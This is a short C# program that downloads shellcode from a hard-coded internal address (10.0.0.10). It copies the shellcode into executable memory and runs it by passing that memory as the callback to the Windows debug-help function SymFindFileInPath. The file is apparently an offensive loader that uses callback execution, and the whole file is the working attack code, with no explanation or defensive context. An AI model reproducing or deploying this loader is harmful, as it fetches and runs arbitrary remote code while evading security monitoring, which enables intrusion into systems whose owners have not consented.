using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace SymFindFileInPath
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string url = "http://10.0.0.10/shellcode.bin";
            System.Net.WebClient client = new System.Net.WebClient();
            byte[] shellcode = client.DownloadData(url);

            IntPtr addr = VirtualAlloc(IntPtr.Zero, shellcode.Length, 0x3000, 0x40);
            Marshal.Copy(shellcode, 0, addr, shellcode.Length);

            IntPtr hProcess = GetCurrentProcess();

            SymInitialize(hProcess, null, false);

            IntPtr Info = IntPtr.Zero;
            SymSrvGetFileIndexInfo("C:\\Windows\\System32\\kernel32.dll", ref Info, 0);

            String FoundFile = null;
            SymFindFileInPath(hProcess, "C:\\Windows\\System32", "kernel32.dll", IntPtr.Zero, 0, 0, 0, ref FoundFile, addr, IntPtr.Zero);
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("dbghelp.dll")]
        static extern bool SymInitialize(IntPtr hProcess, String UserSearchPath, bool fInvadeProcess);

        [DllImport("dbghelp.dll")]
        static extern bool SymSrvGetFileIndexInfo(String File, ref IntPtr Info, uint Flags);

        [DllImport("dbghelp.dll")]
        static extern bool SymFindFileInPath(IntPtr hProcess, String SearchPath, String FileName, IntPtr id, uint two, uint three, uint flags, ref String FoundFile, IntPtr callback, IntPtr context);


    }
}

